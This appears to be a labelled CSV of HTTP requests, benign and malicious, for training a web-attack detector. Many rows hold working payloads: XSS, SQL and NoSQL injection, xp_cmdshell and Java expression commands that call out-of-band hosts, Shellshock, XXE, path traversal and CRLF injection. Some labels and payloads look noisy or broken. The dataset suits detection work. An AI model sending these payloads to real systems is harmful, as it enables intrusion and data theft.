method,path,query,headers,body,ua,label
GET,/,,,,,0
,/index.html,,,,,0
GET,/,?data=OltZJE7ZaPSLmXQJ5%2FpwgCMm%2Fkvon8HP9lmYJYHd6HGZj%2B1z6iPdTo2fAXFQjYu0uZBNAu5xKRVr1O8ayHk17emcTGlFS68UMh68sxuqrvU0c%2BsoUl9SZexU9E0ZFMryS6MuYuOlmCWzObu1S4zC9gdIZQe4voy%2Fn%2Fg4Joi7%2F0PVlz42BqHvOPJJ3GqdwNPWMtwlvGTX%2BnGXp6XhTnWQVAKjSmMWrfancspix9hJfuLtGqBXkszHCpNPvruc8shpHI4F%2FQMg0dO6cMvHYDqWadZVf68MPcP63pxKWklF8NXRmqzIa1fKuV0%3D&signature=6ce4e8ca1b6a6c2a7ecf58b6a7c2355b&subChannelCode=VBA&%3Cscript%3Ealert(1)%3C/script%3E,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,url=/maps/api/geocode/json?address=Reader&daddr=!,,,,0
GET,/,/uploads/628668cae9db4d51b4edf55214b73fca-Facebook-Image.jpg?response-content-disposition=inline%3B%20filename%2A%3DUTF-8%27%276b67c704b68a4517aa6664c1df2f7afe&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=9wnmzzHYVGwlnTscRdzx%2F20260310%2F%2Fs3%2Faws4_request&X-Amz-Date=20260310T023341Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=5bfffbe1cc40d1ef12ee72b2126381daf34408143c87a1c0bf11e66c162e101b&q=%27or%20%271%27=%271%27,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,'>alert(1)</script><script/1=',,,,1
,/robots.txt,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,0
GET,curl and divergence,,,,,0
GET,QUIT,,,,,1
GET,/,?155ec55483=%253Cx%2FOnpointerrawupdate=confirm%2526lpar%3B%29%253Exxxxx,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,"<iframe/onload='this[""src""]=""javas&Tab;cript:al""+""ert``""';>",,,,1
GET,select from,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,sometext<svg onload=alert(document.domain)>?mimeType=text/html,,,,,1
GET,/,onerror=alert(1),,,,1
GET,/,,,,,0
GET,/feed/news.rss,,,,,0
GET,\\::1\c$\users\default\ntuser.dat,,,,,1
GET,gzip compressed content with chosen prefix,,,,,1
GET,1e1 union select users from password,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,javascript:alert(1),,,,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
,/index.html,,,,,0
POST,/,,,"{""name"": ""__import__('os').system('id')""}",,1
POST,/,,,"{""$gt"": """"}",,1
GET,/,,,,,0
GET,"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""i d"")}",,,,,1
GET,/,,,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,0
GET,"3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sy s.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.000.burpco l'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXE C sp_SYS_ProtoOp @id=3",,,,,1
GET,/,/Rnj7kZj.jpeg?q=%27or%201=1,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,//////////////////etc/passwd,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,,,,0
GET,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,,,1
GET,/js/components/AlertDialog.js,,,HTTP/1.1,,0
GET,/assets/octagon-alert-7zrgUous.css,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,,,,0
POST,/,,,"{""name"": ""__import__('os').system('id')""}",,1
POST,/register,,,(detailed user info),,0
GET,<IMG SRC=j&#X41vascript:alert('test')>,,,,,1
GET,/uploads/628668cae9db4d51b4edf55214b73fca-Facebook Image.jpg?response-content-disposition=inline%3B%20filename%2A%3DUTF-8%27%276b67c704b68a4517aa6664c1df2f7afe&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=9wnmzzHYVGwlnTscRdzx%2F20260310%2F%2Fs3%2Faws4_request&X-Amz-Date=20260310T023341Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=5bfffbe1cc40d1ef12ee72b2126381daf34408143c87a1c0bf11e66c162e101b&q=%3Cscript%3E%3C/script%3E,,,,,1
,/,,,,,0
DELETE,/api/v1/cart/items/5,,,,,0
GET,"<?xml version=""1.0"" encoding=""UTF-7""?> +ADwAIQ-DOCTYPE foo+AFs +ADwA IQ-ELEMENT foo ANY +AD4 +ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack- r.be:1337+ACI +AD4AXQA+ +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4",,,,,1
GET,/,|getent+hosts+somehost.burpcollaborator.net.&,,,,1
GET,/static/js/alert.min.js,,,HTTP/1.1,,0
POST,/,,,"{""alg"":""none""}",,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,"3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sy s.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.000.burpco l'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXE C sp_SYS_ProtoOp @id=3",,,,,1
,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/,php://filter/convert.base64-encode/resource=index.php,,,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,select from,,,,,1
,/favicon.ico,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,cat /etc/passwd,,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,"I would like to keep-alive my connection and have the full_text of t he article, please.",,,,,0
GET,/,id=0x27204f52202731273d2731,,,,1
GET,/,?data=OltZJE7ZaPSLmXQJ5%2FpwgCMm%2Fkvon8HP9lmYJYHd6HGZj%2B1z6iPdTo2fAXFQjYu0uZBNAu5xKRVr1O8ayHk17emcTGlFS68UMh68sxuqrvU0c%2BsoUl9SZexU9E0ZFMryS6MuYuOlmCWzObu1S4zC9gdIZQe4voy%2Fn%2Fg4Joi7%2F0PVlz42BqHvOPJJ3GqdwNPWMtwlvGTX%2BnGXp6XhTnWQVAKjSmMWrfancspix9hJfuLtGqBXkszHCpNPvruc8shpHI4F%2FQMg0dO6cMvHYDqWadZVf68MPcP63pxKWklF8NXRmqzIa1fKuV0%3D&signature=6ce4e8ca1b6a6c2a7ecf58b6a7c2355b&subChannelCode=VBA&%3Cscript%3Ealert(1)%3C/script%3E,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,/&lt;svg/onload&equals;alert(1)&gt;,,,,1
GET,/assets/octagon-alert-7zrgUous.js,q=%3Cscript%3E%3C/script%3E,,HTTP/1.1,,1
GET,/,,,,,0
GET,/,adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%20d6d5bt565jrc87ck692gzsym1em9spt3e.oast.me')%7d,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/assets/octagon-alert-7zrgUous.js,q=%27or%201=1;--,,HTTP/1.1,,1
GET,/,&lt;svg/onload&equals;alert(1)&gt;,,,,1
GET,%0d%0aSet-Cookie: session=attacker,,,,,1
